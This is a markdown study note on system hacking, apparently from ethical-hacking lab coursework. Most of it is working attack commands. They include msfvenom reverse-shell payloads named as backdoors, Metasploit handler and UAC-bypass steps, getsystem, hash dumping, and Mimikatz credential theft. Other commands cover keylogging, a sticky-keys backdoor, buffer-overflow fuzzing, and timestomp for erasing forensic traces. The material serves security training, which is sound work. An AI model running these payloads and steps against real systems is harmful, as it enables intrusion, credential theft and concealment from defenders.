# System Hacking
> System hacking is the process of testing computer systems and software for security vulnerabilities that an attacker could exploit to gain access to the organization’s systems to steal or misuse sensitive information.

<br>

There are four steps in the system hacking:

- Gaining Access: Use techniques such as cracking passwords and exploiting vulnerabilities to gain access to the target system
- Escalating Privileges: Exploit known vulnerabilities existing in OSes and software applications to escalate privileges
- Maintaining Access: Maintain high levels of access to perform malicious activities such as executing malicious applications and stealing, hiding, or tampering with sensitive system files
- Clearing Logs: Avoid recognition by legitimate system users and remain undetected by wiping out the entries corresponding to malicious activities in the system logs, thus avoiding detection.


LLMNR (Link Local Multicast Name Resolution) and NBT-NS (NetBIOS Name Service) are two main elements of Windows OSes that are used to perform name resolution for hosts present on the same link. These services are enabled by default in Windows OSes and can be used to extract the password hashes from a user.

Responder is an LLMNR, NBT-NS, and MDNS poisoner. It responds to specific NBT-NS (NetBIOS Name Service) queries based on their name suffix. By default, the tool only responds to a File Server Service request, which is for SMB.

- responder -I eth0
- https://www.exploit-db.com/

```
msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -f exe LHOST=[IP Address of Host Machine] LPORT=444 -o /home/attacker/Desktop/Test.exe
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
```

- https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1
  - PowerUp.ps1 is a program that enables a user to perform quick checks against a Windows machine for any privilege escalation opportunities. It utilizes various service abuse checks, .dll hijacking opportunities, registry checks, etc. to enumerate common elevation methods for a target system.
  - `powershell -ExecutionPolicy Bypass -Command ". .\PowerUp.ps1;Invoke-AllChecks"`
- run vnc

Armitage:
- Armitage is a scriptable red team collaboration tool for Metasploit that visualizes targets, recommends exploits, and exposes the advanced post-exploitation features in the framework. Using this tool, you can create sessions, share hosts, capture data, downloaded files, communicate through a shared event log, and run bots to automate pen testing tasks.

Ninja Jonin:
- Ninja Jonin is a combination of two tools; Ninja is installed in victim machine and Jonin is installed on the attacker machine. The main functionality of the tool is to control a remote machine behind any NAT, Firewall and proxy.
- https://github.com/ErAz7/Jonin

Buffer Overlow:
- generic_send_tcp 10.10.1.11 9999 stats.spk 0 0
  - Here, 10.10.1.11 is the IP address of the target machine (Windows 11), 9999 is the target port number, stats.spk is the spike_script, and 0 and 0 are the values of SKIPVAR and SKIPSTR.
  - stats.spk
```
s_readline();
s_string(“TRUN ”);
s_string_variable(“0”);
```

-  /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 11900
- msfvenom -p windows/shell_reverse_tcp LHOST=[Local IP Address] LPORT=[Listening Port] EXITFUNC=thread -f c -a x86 -b “\x00”
  - Here, -p: payload, local IP address: 10.10.1.13, listening port: 4444., -f: filetype, -a: architecture, -b: bad character.


Privileges are a security role assigned to users for specific programs, features, OSes, functions, files, or codes. They limit access by type of user. Privilege escalation is required when you want to access system resources that you are not authorized to access. It takes place in two forms: vertical privilege escalation and horizontal privilege escalation.

- Horizontal Privilege Escalation: An unauthorized user tries to access the resources, functions, and other privileges that belong to an authorized user who has similar access permissions

- Vertical Privilege Escalation: An unauthorized user tries to gain access to the resources and functions of a user with higher privileges such as an application or site administrator

```
msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -e x86/shikata_ga_nai -b "\x00" LHOST=10.10.1.13 -f exe > /home/attacker/Desktop/Exploit.exe
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
sessions -i 1 

run post/windows/gather/smart_hashdump

getsystem -t 1
: Uses the service – Named Pipe Impersonation (In Memory/Admin) Technique.

 use exploit/windows/local/bypassuac_fodhelper 
 set SESSION 1
 set payload windows/meterpreter/reverse_tcp
 
 getsystem -t 1
 run post/windows/gather/smart_hashdump
 
 
 msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -e x86/shikata_ga_nai -b "\x00" LHOST=10.10.1.13 -f exe > /home/attacker/Desktop/Backdoor.exe
 
 ```
While performing post-exploitation activities, an attacker tries to access files to read their contents. Upon doing so, the MACE (modified, accessed, created, entry) attributes immediately change, which indicates to the file user or owner that someone has read or modified the information.

To leave no trace of these MACE attributes, use the timestomp command to change the attributes as you wish after accessing a file.

- timestomp Secret.txt -v 
- timestomp Secret.txt -m “02/11/2018 08:10:03”
  - -m: specifies the modified value.
  - Accessed (-a), Created (-c), and Entry Modified (-e) 
- search -f [Filename.extension]
- keyscan_start 
  - start capturing all keyboard input from the target system.
- dir /a:h 
  - retrieve the directory names with hidden attributes.
- sc queryex type=service state=all 
  - list all the available services
- netsh firewall show state
- netsh firewall show config
- wmic /node:"" product get name,version,vendor 
  - view the details of installed software.
- wmic cpu get
- wmic useraccount get name,sid 
  - retrieve login names and SIDs of the users.
- wmic os where Primary='TRUE' reboot 
  - reboot the target system.

![image](https://user-images.githubusercontent.com/79740895/226418913-1c73a227-5caa-40c2-a229-44a9110baf72.png)

Exploiting Vulnerability in pkexec
- Polkit or Policykit is an authorization API used by programs to elevate permissions and run processes as an elevated user.The successful exploitation of the Polkit pkexec vulnerability allows any unprivileged user to gain root privileges on the vulnerable host.

- In the pkexec.c code, there are parameters that doesn’t handle the calling correctly which ends up in trying to execute environment variables as commands. Attackers can exploit this vulnerability by designing an environment variable in such a manner that it will enable pkexec to execute an arbitrary code.

Misconfigured NFS
- Network File System (NFS) is a protocol that enables users to access files remotely through a network. Remote NFS can be accessed locally when the shares are mounted. If NFS is misconfigured, it can lead to unauthorized access to sensitive data or obtain a shell on a system.

- showmount -e 10.10.1.9 
  - check if any share is available for mount in the target machine.
- sudo mount -t nfs 10.10.1.9:/home /tmp/nfs
- find / -name "*.txt" -ls 2> /dev/null 
  - view all the .txt files on the system
- find / -perm -4000 -ls 2> /dev/null 
  - view the SUID executable binaries.

Exploiting Sticky Keys
- Sticky keys is a Windows accessibility feature that causes modifier keys to remain active, even after they are released. Sticky keys help users who have difficulty in pressing shortcut key combinations. They can be enabled by pressing Shift key for 5 times. Sticky keys also can be used to obtain unauthenticated, previleged access to the machine.

```
msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.1.13 lport=444 -f exe > /home/attacker/Desktop/Windows.exe
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp

search bypassuac
use exploit/windows/local/bypassuac_fodhelper
getsystem -t 1 

use post/windows/manage/sticky_keys
```

Gather Hashdump using Mimikatz
- Mimikatz is a post exploitation tool that enables users to save and view authentication credentials such as kerberos tickets, dump passwords from memory, PINs, as well as hashes. It enables you to perform functions such as pass-the-hash, pass-the-ticket, and makes post exploitation lateral movement within a network.

bypass Windows UAC protection via the FodHelper Registry Key. It is present in Metasploit as a bypassuac_fodhelper exploit.

- load kiwi 
  - load mimikatz.
- help kiwi 
  - view all the kiwi commands.
- lsa_dump_sam 
  - load NTLM Hash of all users.
- lsa_dump_secrets
  - LSA secrets are used to manage a system's local security policy, and contain sensitive data such as User passwords, IE passwords, service account passwords, SQL passwords etc.
- password_change -u Admin -n [NTLM hash of Admin acquired in previous step] -P password


Discussed below are some of the remote code execution techniques:

- Exploitation for client execution
- Scheduled task
- Service execution
- Windows Management Instrumentation (WMI)
- Windows Remote Management (WinRM)

Hiding Files: Hiding files is the process of hiding malicious programs using methods such as rootkits, NTFS streams, and steganography techniques to prevent the malicious programs from being detected by protective applications such as Antivirus, Anti-malware, and Anti-spyware applications that may be installed on the target system. This helps in maintaining future access to the target system as a hidden malicious file provides direct access to the target system without the victim’s consent.










